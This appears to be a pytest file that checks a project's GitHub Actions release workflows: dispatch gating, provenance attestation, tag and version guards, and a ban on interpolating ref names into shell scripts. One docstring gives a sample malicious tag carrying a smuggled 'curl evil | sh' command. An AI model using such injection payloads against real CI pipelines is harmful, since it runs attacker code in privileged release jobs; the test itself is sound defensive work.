"""Pins the release workflows' dispatch-publish wiring.

Invariant: a release is publishable straight from the Actions tab,
main-only and version-asserted, across ``windows-package.yml`` (dispatch,
provenance attestation, unsigned-installer labeling, #282) and
``release.yml`` (PyPI Trusted Publishing).

Also pins one security property across EVERY workflow: a ref/tag name
must never reach a ``run:`` script through ``${{ }}`` interpolation, only
a quoted ``env:`` value.
"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any

import yaml

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOW_DIR = REPO_ROOT / ".github" / "workflows"
WINDOWS_YML = WORKFLOW_DIR / "windows-package.yml"
RELEASE_YML = WORKFLOW_DIR / "release.yml"

#: Context values an outside contributor can shape (a branch or tag name, an
#: issue/PR title or body). Interpolating any of these into a shell script is
#: the GitHub Actions script-injection class.
_UNTRUSTED_CONTEXT_RE = re.compile(
    r"\$\{\{[^}]*\b(github\.(ref|ref_name|head_ref|event)\b|inputs\.)[^}]*\}\}"
)

# PyYAML resolves the bare ``on:`` key to the YAML 1.1 boolean True, not the
# string "on" — so every workflow's trigger block lives under ``data[_ON]``.
_ON = True


def _load(path: Path) -> dict[Any, Any]:
    # Keys are mostly str, but the bare ``on:`` trigger block parses to the bool
    # ``True`` (see ``_ON``), so the mapping is not uniformly str-keyed.
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    assert isinstance(data, dict), f"{path.name} did not parse to a mapping"
    return data


def _gh_release_step(steps: list[dict[str, Any]]) -> dict[str, Any]:
    for step in steps:
        if str(step.get("uses", "")).startswith("softprops/action-gh-release"):
            return step
    raise AssertionError("no softprops/action-gh-release step in the release job")


def test_windows_dispatch_has_boolean_publish_input() -> None:
    data = _load(WINDOWS_YML)
    publish = data[_ON]["workflow_dispatch"]["inputs"]["publish"]
    assert publish["type"] == "boolean", (
        "windows-package.yml workflow_dispatch must expose a boolean `publish` "
        f"input (found type {publish.get('type')!r}); the release job's `if` reads "
        "it as a real boolean via the `inputs` context."
    )
    assert publish.get("default") is False, (
        "the `publish` input must default to false so a bare manual dispatch only "
        "validates — publishing is opt-in."
    )


def test_windows_release_if_gates_on_tag_or_publish() -> None:
    data = _load(WINDOWS_YML)
    cond = data["jobs"]["release"]["if"]
    assert "refs/tags/v" in cond and "inputs.publish" in cond, (
        "the release job must fire on a version tag OR an explicit dispatch "
        f"publish; its `if` is {cond!r}."
    )


def test_windows_gh_release_creates_tag_at_this_ref() -> None:
    data = _load(WINDOWS_YML)
    with_ = _gh_release_step(data["jobs"]["release"]["steps"])["with"]
    for key in ("tag_name", "target_commitish", "prerelease"):
        assert key in with_, (
            f"the gh-release step must carry `{key}` so a dispatch publish creates "
            "tag v<version> at this SHA while keeping the prerelease flag."
        )


def test_windows_release_job_has_attestation_permissions() -> None:
    """The release job needs id-token + attestations to call
    actions/attest-build-provenance, on top of the contents: write it already
    holds to attach the release (#282: no build-provenance attestation)."""
    data = _load(WINDOWS_YML)
    perms = data["jobs"]["release"]["permissions"]
    assert perms.get("contents") == "write", (
        "the release job must keep contents: write for the gh-release upload"
    )
    assert perms.get("id-token") == "write", (
        "the release job must hold id-token: write for Sigstore signing — the "
        "same grant release.yml's build job already carries for its own "
        "attest-build-provenance step."
    )
    assert perms.get("attestations") == "write", (
        "the release job must hold attestations: write to persist the "
        "provenance attestation to GitHub."
    )


def test_windows_release_attests_exe_and_sbom_before_upload() -> None:
    """Provenance is attested for the downloaded exe/SBOM, after they land on
    the runner and before they are attached to the release — so what gets
    attested is exactly what the download-artifact step fetched, not
    something re-fetched or re-derived later (#282)."""
    data = _load(WINDOWS_YML)
    steps = data["jobs"]["release"]["steps"]
    download = _step_index(steps, "Download the built installer")
    attest = _step_index(steps, "Attest build provenance")
    attach = _step_index(steps, "Attach it to the release")
    assert download < attest < attach, (
        "actions/attest-build-provenance must run after the installer is "
        "downloaded and before it is attached to the release"
    )
    step = steps[attest]
    assert str(step.get("uses", "")).startswith("actions/attest-build-provenance@"), (
        f"expected an actions/attest-build-provenance step, found {step!r}"
    )
    subject_path = step["with"]["subject-path"]
    assert "installer/*.exe" in subject_path
    assert "installer/*.cdx.json" in subject_path, (
        "the SBOM must be attested alongside the exe, not just the installer"
    )


def test_windows_release_notes_label_the_installer_unsigned() -> None:
    """Until a trusted Authenticode certificate exists, every release must say
    the installer is unsigned and name `gh attestation verify` as the
    fallback check (#282) — a SHA-256 table is not a substitute for publisher
    identity, and this release note is the only place a downloader sees
    that distinction spelled out."""
    data = _load(WINDOWS_YML)
    steps = data["jobs"]["release"]["steps"]
    notes_step = steps[_step_index(steps, "Extract this version's CHANGELOG section")]
    run = notes_step["run"]
    assert "unsigned" in run.lower(), (
        "the release-notes step must plainly label the installer unsigned"
    )
    assert "gh attestation verify" in run, (
        "the release-notes step must point at `gh attestation verify` as the "
        "supply-chain check that stands in for a publisher signature"
    )


def test_release_yml_is_dispatchable() -> None:
    data = _load(RELEASE_YML)
    assert "workflow_dispatch" in data[_ON], (
        "release.yml must be dispatchable: a GITHUB_TOKEN-created tag does not "
        "cascade-trigger its push trigger, so the PyPI publish needs its own "
        "workflow_dispatch."
    )


def test_release_yml_first_step_guards_non_main_dispatch() -> None:
    data = _load(RELEASE_YML)
    first = data["jobs"]["build"]["steps"][0]
    guard = f"{first.get('if', '')} {first.get('run', '')}"
    assert "workflow_dispatch" in guard and "refs/heads/main" in guard, (
        "release.yml's first build step must refuse a dispatch from any ref but "
        f"main; its guard is {first!r}."
    )


def _step_index(steps: list[dict[str, Any]], marker: str) -> int:
    for i, step in enumerate(steps):
        if marker in f"{step.get('name', '')} {step.get('run', '')}":
            return i
    raise AssertionError(f"no step matching {marker!r}")


def test_release_yml_asserts_tag_matches_built_version_before_building() -> None:
    """A mistyped `v*` tag must fail BEFORE anything is built or
    published: PyPI publishes whatever version the SOURCE carries, so an
    unguarded stale tag would mint a release whose tag, artifacts, and
    index disagree — the same invariant windows-package.yml enforces."""
    data = _load(RELEASE_YML)
    steps = data["jobs"]["build"]["steps"]
    guard = _step_index(steps, "tag names the version")
    build = _step_index(steps, "python -m build")
    assert guard < build, "the tag/version assert must run before the build"
    step = steps[guard]
    run = step["run"]
    # The tag reaches the script through the environment (see
    # ``test_workflow_run_blocks_never_interpolate_untrusted_context``), so the
    # guard is `env: REF_NAME: ${{ github.ref_name }}` + a quoted `$REF_NAME`.
    assert step.get("env", {}).get("REF_NAME") == "${{ github.ref_name }}", (
        "the guard must take the triggering tag from the environment, not from "
        f"a `${{{{ }}}}` interpolation; its env is {step.get('env')!r}"
    )
    assert "__version__" in run and '"$REF_NAME"' in run, (
        "the guard must derive the version from the package source and compare "
        f"it against the triggering tag; its run block is {run!r}"
    )


def test_release_yml_asserts_wheel_carries_third_party_licenses() -> None:
    """The built wheel must carry the Apache-2.0 and OFL-1.1 full texts:
    it redistributes the HL7 CDA stylesheet and the two GUI fonts, and
    this step is what keeps a packaging-config regression from shipping a
    wheel stripped of the attributions it owes."""
    data = _load(RELEASE_YML)
    steps = data["jobs"]["build"]["steps"]
    build = _step_index(steps, "python -m build")
    check = _step_index(steps, "third-party license texts")
    assert build < check, "the wheel content check must run after the build"
    run = steps[check]["run"]
    for needle in ("APACHE-2.0.txt", "OFL-1.1.txt", "THIRD_PARTY_LICENSES.md"):
        assert needle in run, f"the wheel content check must assert {needle}"


def _run_blocks(path: Path) -> list[tuple[str, str]]:
    """Every ``(step label, run script)`` pair in a workflow, jobs included."""
    data = _load(path)
    blocks: list[tuple[str, str]] = []
    jobs = data.get("jobs") or {}
    for job_name, job in jobs.items():
        for index, step in enumerate(job.get("steps") or []):
            script = step.get("run")
            if isinstance(script, str):
                label = step.get("name") or f"step {index}"
                blocks.append((f"{path.name}:{job_name}:{label}", script))
    return blocks


def test_workflow_run_blocks_never_interpolate_untrusted_context() -> None:
    """No ``run:`` script may interpolate a ref/tag name or a dispatch
    input: ``${{ github.ref_name }}`` is substituted BEFORE bash sees it,
    so a tag named ``v1.0"; curl evil | sh; "`` executes inside a job
    holding ``id-token``/``contents: write``. The safe form is an
    ``env:`` entry and a quoted ``"$REF_NAME"`` in the script."""
    offenders: list[str] = []
    for workflow in sorted(WORKFLOW_DIR.glob("*.yml")):
        for label, script in _run_blocks(workflow):
            for hit in _UNTRUSTED_CONTEXT_RE.findall(script):
                offenders.append(f"{label}: {hit}")
    assert not offenders, (
        "these run blocks interpolate attacker-shaped context directly into a "
        f"shell script; pass them via `env:` and quote the variable: {offenders}"
    )


def test_the_release_guards_take_their_refs_from_the_environment() -> None:
    """The positive half: the two release guards DO carry the env wiring.

    Without this, deleting the ``env:`` block and the comparison together would
    keep the negative test above green while removing the guard entirely.
    """
    release_steps = _load(RELEASE_YML)["jobs"]["build"]["steps"]
    release_guard = release_steps[_step_index(release_steps, "tag names the version")]
    assert release_guard["env"]["REF_NAME"] == "${{ github.ref_name }}"
    assert '"$REF_NAME"' in release_guard["run"]

    windows_steps = _load(WINDOWS_YML)["jobs"]["release"]["steps"]
    windows_guard = windows_steps[_step_index(windows_steps, "Assert the release source")]
    assert windows_guard["env"]["REF"] == "${{ github.ref }}"
    assert windows_guard["env"]["REF_NAME"] == "${{ github.ref_name }}"
    assert '"$REF"' in windows_guard["run"] and '"$REF_NAME"' in windows_guard["run"]
